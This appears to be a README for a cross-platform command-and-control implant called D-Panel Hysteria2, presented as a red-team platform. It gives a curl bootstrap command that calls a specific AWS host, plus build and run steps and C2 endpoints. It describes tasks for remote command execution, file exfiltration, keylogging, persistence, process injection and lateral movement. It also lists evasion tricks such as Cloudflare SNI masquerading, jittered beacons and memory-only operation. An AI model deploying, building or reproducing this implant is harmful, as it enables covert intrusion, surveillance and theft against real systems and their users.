# D-Panel Hysteria2 QUIC Implant

A lightweight, cross-platform C2 implant that communicates over Hysteria2 QUIC protocol for covert operations.

## Features

- **QUIC-based Communication** - Blends in with normal HTTP/3 traffic
- **Cross-Platform Support** - Windows, Linux, macOS (x86/x64/ARM)
- **Jittered Beaconing** - Configurable sleep intervals with randomization
- **Task Execution** - Remote command execution and system operations
- **Encrypted Communication** - End-to-end encryption for all C2 traffic
- **Small Footprint** - Compiled binary under 10MB

## Quick Start

### 1. Generate Implant Configuration
```bash
# Bootstrap from D-Panel server
curl "https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/sub/hysteria2?token=dpanel-implant-bootstrap-token-change-this&implant=true"
```

### 2. Run Implant
```bash
# Linux/macOS
./h2-implant-linux-amd64

# Windows
h2-implant-windows-amd64.exe

# Show version
./h2-implant-linux-amd64 -v
```

## Configuration

The implant automatically fetches configuration from the D-Panel subscription endpoint:

- **Servers**: Hysteria2 C2 servers
- **Authentication**: Password-based auth
- **Beaconing**: 45s base interval ±25s jitter
- **SNI**: Cloudflare.com for traffic blending
- **Obfuscation**: Salamander protocol

## Task Types

| Task Type | Description |
|-----------|-------------|
| `exec` | Execute system commands |
| `info` | Gather system information |
| `sleep` | Change beacon interval |
| `download` | Download files from target |
| `upload` | Upload files to target |
| `screenshot` | Capture desktop screenshots |
| `keylogger` | Keylogger operations |
| `persist` | Persistence mechanisms |
| `inject` | Process injection |
| `lateral` | Lateral movement |
| `selfdestruct` | Self-destruct implant |

## API Endpoints

- **Subscription**: `/api/sub/hysteria2`
- **Task Polling**: `/api/dpanel/implant/tasks`
- **Result Upload**: `/api/dpanel/implant/result`

## Security Features

- TLS 1.3 encryption
- HTTP/3 QUIC protocol
- SNI masquerading
- Jittered communications
- No persistent storage

## Building from Source

```bash
# Install dependencies
go mod tidy

# Build for all platforms
./build.sh

# Build for specific platform
GOOS=linux GOARCH=amd64 go build -o h2-implant .
```

## Deployment Notes

- Target server: **ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com**
- Default port: **443** (HTTPS)
- Backup port: **8080**
- Protocol: **Hysteria2 over QUIC**

## Operational Security

- All traffic appears as normal Cloudflare HTTP/3
- Implant uses no disk-based configuration
- Memory-only operation where possible
- Automatic cleanup on self-destruct

## Troubleshooting

### Connection Issues
- Verify server connectivity: `telnet ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com 443`
- Check DNS resolution for Cloudflare SNI
- Validate firewall allows UDP outbound

### Authentication Failures
- Verify bootstrap token is correct
- Check server clock synchronization
- Ensure server URL is accessible

### Performance Issues
- Adjust beacon intervals via `sleep` task
- Monitor network latency to C2 server
- Consider server geographic location

---
**D-Panel Red Team Operations Platform**  
*Advanced C2 Infrastructure for Professional Red Team Operations*